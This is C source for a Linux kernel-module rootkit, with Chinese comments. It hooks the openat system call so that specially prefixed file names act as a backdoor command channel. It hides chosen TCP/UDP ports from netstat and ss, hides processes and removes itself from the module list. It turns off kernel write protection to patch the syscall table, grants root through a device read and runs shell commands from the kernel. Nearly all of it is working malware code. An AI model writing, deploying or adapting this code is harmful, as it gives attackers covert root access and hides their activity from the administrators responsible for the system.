#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/slab.h>
#include "rootkit.h"

static char command[PATH_MAX];

// seq_operations里存放了seq_show_fun的指针
static struct seq_operations *tcp_operations, *udp_operations, *tcp6_operations, *udp6_operations;
// seq_show_fun为netstat在展示端口信息时使用的函数,需要把它hook掉
static seq_show_fun tcp_seq_fun,udp_seq_fun,tcp6_seq_fun,udp6_seq_fun;

static LIST_HEAD(hidden_port_list_head); //初始化链表头



// 自己写的sys_openat函数
// sys_openat(int dfd,const char__user *filename,int flags,umode_t mode);
static long my_sys_openat(const struct pt_regs *regs)
{
    //todo
    struct pt_regs user_regs;
    int type;
    int port;
    pid_t pid_num;
    memcpy(&user_regs, regs, sizeof(struct pt_regs));

    if (strncpy_from_user(command, (void *)regs->si, PATH_MAX) < 0)
    {
        return -EFAULT;
    }

    // 比对输入的命令和自己设置的后门的开头
    if (strncmp(command, BACKDOOR_PREFIX, strlen(BACKDOOR_PREFIX)) == 0)
    {
        pr_info("my_sys_openat: %s", command);
        if (strncmp(command, HIDE_PORT, strlen(HIDE_PORT)) == 0){
            // 获得需要隐藏的端口和网络类型
            if (get_connect_param(&command[strlen(HIDE_PORT) + 1], &port, &type))
            {
                hide_connect(type, port);
            }
            else
            {
                pr_info("parse hide port command fail.");
            }
        }
        else if (strncmp(command, UNHIDE_PORT, strlen(UNHIDE_PORT)) == 0){
            if (get_connect_param(&command[strlen(UNHIDE_PORT) + 1], &port, &type))
            {
                unhide_connect(type, port);
            }
            else
            {
                pr_info("parse unhide port command fail.");
            }
        }
        //下面三个分别是hide_pid  unhide_pid unhide_all_pid 的后门
        //使用: cat '##hide_pid 666'
        else if (strncmp(command, HIDE_PID, strlen(HIDE_PID)) == 0){
            if (sscanf(&command[strlen(HIDE_PID) + 1], "%d", &pid_num) == 1)
            {
                hide_pid_fn(pid_num);
            }
            else
            {
                pr_info("parse hide process command fail.");
            }
        }
        else if (strncmp(command, UNHIDE_PID, strlen(UNHIDE_PID)) == 0){
            if (sscanf(&command[strlen(UNHIDE_PID) + 1], "%d", &pid_num) == 1)
            {
                recover_pid_fn(pid_num);
            }
            else
            {
                pr_info("parse unhide process command fail.");
            }
        }
        else if (strncmp(command, UNHIDE_ALL_PID, strlen(UNHIDE_PORT)) == 0){
            recover_pid_all();
        }
        else
        {
            // 调用真正的openat
            return real_sys_openat(regs);
        }
    }
    else
    {
        return real_sys_openat(regs);
    }
    return -EFAULT;
}

inline void mywrite_cr0(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(cr0), "+m"(__force_order));
}

void enable_wp(void)
{
    // 可能存在条件竞争
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    mywrite_cr0(cr0);
    preempt_enable();

    return;
}

void disable_wp(void)
{
    // 可能存在条件竞争
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    mywrite_cr0(cr0);
    preempt_enable();

    return;
}

// 修改cred获得root权限
static void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
    // 第二种方法同样可行
    // commit_creds(prepare_creds(NULL);
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit read##");
    get_root();
    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit wirte##");
    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}

static inline void module_info(void)
{
    prev = THIS_MODULE->list.prev;
}

// 模块隐藏函数定义
static void hide_myself(void)
{
    // 摘除链表，/proc/modules中不可见
    list_del(&THIS_MODULE->list);

    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);
}

// 模块隐藏恢复
static void show_myself(void)
{
    list_add(&THIS_MODULE->list, prev);
    // kobject_put(&mod.mkobj.kobj);
}

// 命令执行模块
static char *exec_cmd(char *cmd)
{
    int result;
    loff_t pos;
    struct file *fp;
    static char buf[1024];
    char *cmd_path = "/bin/sh";
    char *output = " > /tmp/result.txt";
    char *tmp = kmalloc(256, GFP_KERNEL);
    strcpy(tmp, cmd);
    strcat(tmp, output);
    char *cmd_argv[] = {cmd_path, "-c", tmp, NULL};
    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    pr_info("[TestKthread]: call_usermodehelper() result is %d\n", result);
    kfree(tmp);

    fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
    if (IS_ERR(fp))
    {
        pr_info("open file failed!");
        return 0;
    }
    memset(buf, 0, sizeof(buf));
    pos = 0;
    kernel_read(fp, buf, sizeof(buf), &pos);
    pr_info("shell result %ld:\n", strlen(buf));
    pr_info("%s\n", buf);
    filp_close(fp, NULL);
    return buf;
}

bool get_connect_param(const char* str,int *port,int *type){
    pr_info("get_connect_param:%s",str);
    if (!strncmp(str, "tcp6", 4)){
        *type = TCP6_CONNECT;
        return sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp6", 4))
    {
        *type = UDP6_CONNECT;
        return sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "tcp", 3))
    {
        *type = TCP_CONNECT;
        return sscanf(str + 4, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp", 3))
    {
        *type = UDP_CONNECT;
        return sscanf(str + 4, "%d", port) == 1;
    }
    return false;
}

int hide_connect_init(void **real_sys_call_table){
    // 获取真实的recvmsg函数地址(用于ss)
    real_sys_recvmsg = real_sys_call_table[__NR_recvmsg];
    // 关闭写保护
    disable_wp();
    real_sys_call_table[__NR_recvmsg] = my_sys_recvmsg;
    // 开启写保护
    enable_wp();

    // 依次获得tcp、udp、tcp6和udp6的operations
    set_seq_operations("/proc/net/tcp",&tcp_operations);
    set_seq_operations("/proc/net/udp",&udp_operations);
    set_seq_operations("/proc/net/tcp6",&tcp6_operations);
    set_seq_operations("/proc/net/tcp6",&udp6_operations);
    
    // 如果获取operation失败
    if((!tcp_operations)||(!udp_operations)||(!tcp6_operations)||(!udp6_operations)){
        pr_info("get network opeartions fail.");
    }
    // 依次将tcp、udp、tcp6和udp6的show函数hook掉
    hook_seq_operations(tcp_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&tcp_seq_fun);
    hook_seq_operations(udp_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&udp_seq_fun);
    hook_seq_operations(tcp6_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&tcp6_seq_fun);
    hook_seq_operations(udp6_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&udp6_seq_fun);

    pr_info("hook_seq_operations_success.\n");
    return 1;
}


int hide_connect_exit(void **real_sys_call_table){
    struct port_node *entry = NULL, *next_entry = NULL;
    disable_wp();
    // 将之前hook的函数修改回去
    real_sys_call_table[__NR_recvmsg] = real_sys_recvmsg;
    enable_wp();

    // 将之前hook的函数修改回去
    hook_seq_operations(tcp_operations, offsetof(struct seq_operations, show), tcp_seq_fun, NULL);
    hook_seq_operations(udp_operations, offsetof(struct seq_operations, show), udp_seq_fun, NULL);
    hook_seq_operations(tcp6_operations, offsetof(struct seq_operations, show), tcp6_seq_fun, NULL);
    hook_seq_operations(udp6_operations, offsetof(struct seq_operations, show), udp6_seq_fun, NULL);

    pr_info("Restore port success\n");

    //  删除所有链表节点
    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list){
        list_del(&entry->list);
        kfree(entry);
    }
    return 0;
}


void set_seq_operations(const char* open_path,struct seq_operations** operations){
    struct file *open_file = NULL;
    //打开 /proc/net/{tcp|udp|tcp6|udp6}
    open_file = filp_open(open_path, O_RDONLY, 0);
    if (IS_ERR(open_file)){
        pr_info("Failed to open %s with error %ld.\n", open_path, PTR_ERR(open_file));
        *operations = NULL;
    }
    else{
        // 获取operations函数
        *operations = (struct seq_operations *)((struct seq_file *)(open_file->private_data))->op;
        filp_close(open_file, 0);
        pr_info("get operations,operations:%p",*operations);
    }
    return;
}

void hook_seq_operations(void *base, size_t offset, void *new_ptr, void **old_ptr){
    // 保存旧值
    if (old_ptr){
        *old_ptr = *(void **)((char *)base + offset);
        pr_info("Save old_ptr: %p\n", *old_ptr);
    }

    pr_info("Changing %p->%p to %p.\n", base, (void *)offset, new_ptr);
    disable_wp();
    *(void **)((char *)base + offset) = new_ptr;
    enable_wp();
}

int fake_seq_show(struct seq_file *seq, void *v){
    int ret;
    int last_len, this_len;
    char port_str_buf[PORT_STR_LEN];
    int type;

    struct port_node *node = NULL;

    last_len = seq->count;
    if (seq->op == tcp_operations){
        type = TCP_CONNECT;
        //调用原有的show函数
        ret = tcp_seq_fun(seq,v);
    }
    else if (seq->op == udp_operations){
        type = UDP_CONNECT;
        ret = udp_seq_fun(seq,v);
    }
    else if (seq->op == tcp6_operations){
        type = TCP6_CONNECT;
        ret = tcp6_seq_fun(seq,v);
    }
    else if (seq->op == udp6_operations){
        type = UDP6_CONNECT;
        ret = udp6_seq_fun(seq,v);
    }
    // 获取新增的长度
    this_len = seq->count - last_len;

    // 对hidden_port_list_head遍历
    list_for_each_entry(node, &hidden_port_list_head, list){
        if (type == node->type){
            // seq->buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf
            snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
            // 之后将缓冲区的新增字符串和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
            if (strnstr(seq->buf + last_len, port_str_buf, this_len)){
                pr_info("Hiding port: %d", node->port);
                seq->count = last_len;
                break;
            }
        }
    }
    return ret;
}

void hide_connect(int type, int port){
    struct port_node *node = NULL;

    node = kmalloc(sizeof(struct port_node), GFP_KERNEL);
    node->port = port;
    node->type = type;

    // 向链表中添加节点
    list_add_tail(&node->list, &hidden_port_list_head);
    pr_info("Add hide port: %d", port);
}

void unhide_connect(int type, int port){
    struct port_node *entry = NULL, *next_entry = NULL;

    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list){
        if (entry->port == port && entry->type == type){
            pr_info("Unhiding: %d", port);
            list_del(&entry->list); // 将要隐藏的节点从链表中删除
            kfree(entry);
            return;
        }
    }
}


static ssize_t my_sys_recvmsg(const struct pt_regs *regs){
    // int sockfd, struct user_msghdr __user *msg, unsigned flags
    long ret;
    struct nlmsghdr *nlh, *nlh_kernel;
    void *nlh_user_ptr;
    long count;
    char *stream;
    int offset;
    int i;
    struct user_msghdr msg;
    struct iovec *msg_iov;
    // 调用原有的recvmsg函数
    ret = real_sys_recvmsg(regs);

    /* Some error occured. Don't do anything. */
    if (ret <= 0)
        return ret;

    /* Extract netlink message header from message */
    // 获取网络信息
    if (copy_from_user(&msg, (void *)regs->si, sizeof(struct user_msghdr))){
        pr_info("copy_from_user fail.\n");
        return ret;
    }

    msg_iov = msg.msg_iov;

    if (copy_from_user(&nlh_user_ptr, &msg_iov->iov_base, sizeof(void *))){
        pr_info("copy_from_user fail.\n");
        return ret;
    }

    nlh_kernel = (struct nlmsghdr *)kmalloc(ret, GFP_KERNEL);

    if (copy_from_user(nlh_kernel, nlh_user_ptr, ret)){
        pr_info("copy_from_user fail.\n");
        kfree(nlh_kernel);
        return ret;
    }

    nlh = nlh_kernel;
    // count代表信息的长度
    count = ret;

    while (NLMSG_OK(nlh, count)){

        // 如果端口信息匹配上
        if (!data_should_be_masked(nlh)){
            nlh = NLMSG_NEXT(nlh, count);
            continue;
        }

        stream = (char *)nlh;
        offset = NLMSG_ALIGN((nlh)->nlmsg_len);

        /* Copy remaining entries over the data to be masked */
        for (i = 0; i < count; i++){
            stream[i] = stream[i + offset];
        }

        /* Adjust the data length */
        ret -= offset;
    }

    if (copy_to_user_mcsafe(nlh_user_ptr, nlh_kernel, ret)){
        pr_info("copy_to_user_mcsafe fail.");
    }

    kfree(nlh_kernel);
    return ret;
}


static bool data_should_be_masked(struct nlmsghdr *nlh){
    struct inet_diag_msg *r;
    int sport,dport;
    struct port_node *node = NULL;

    /* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
    r = NLMSG_DATA(nlh);

    /* From the ancilliary data extract the port associated with the socket identity */
    sport = ntohs(r->id.idiag_sport);
    dport = ntohs(r->id.idiag_dport);

    list_for_each_entry(node, &hidden_port_list_head, list){
        if (sport == node->port || dport == node->port){
            return true;
        }
    }
    return false;
}
